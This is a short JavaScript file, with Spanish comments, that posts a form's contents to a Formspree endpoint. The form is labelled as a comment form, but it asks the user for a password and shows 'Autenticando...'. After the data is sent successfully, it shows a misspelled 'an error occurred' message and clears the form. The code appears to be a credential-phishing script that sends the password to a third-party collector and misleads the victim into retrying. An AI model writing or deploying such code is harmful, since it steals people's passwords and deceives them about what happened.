// Código JS para enviar a Formspree (ya con tu endpoint)
const form = document.getElementById('commentForm');
const feedback = document.getElementById('feedback');
const submitBtn = document.getElementById('submitBtn');
const spinner = document.getElementById('spinner');

function showFeedback(msg, type='') {
  feedback.textContent = msg;
  feedback.className = 'feedback' + (type ? ` ${type}` : '');
}

form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const formData = new FormData(form);
  const message = (formData.get('message') || '').toString().trim();
  if (!message) {
    showFeedback('Por favor ecriba la cotraseña .', 'error');
    return;
  }

  submitBtn.disabled = true;
  spinner.style.display = 'inline-block';
  showFeedback('Autenticando...');

  try {
    const action = form.getAttribute('action');
    const res = await fetch(action, {
      method: 'POST',
      headers: { 'Accept': 'application/json' },
      body: formData
    });

    // Leer como texto y parsear con seguridad
    const text = await res.text();
    let data = null;
    try { data = text ? JSON.parse(text) : null; } catch (err) { data = null; }

    if (res.ok) {
      showFeedback('A ocrrido un herror ', 'success');
      form.reset();
    } else {
      const errMsg = data?.error || data?.message || `${res.status} ${res.statusText}`;
      showFeedback('Error: ' + errMsg, 'error');
    }
  } catch (err) {
    showFeedback('Error de red: ' + err.message, 'error');
  } finally {
    submitBtn.disabled = false;
    spinner.style.display = 'none';
  }
});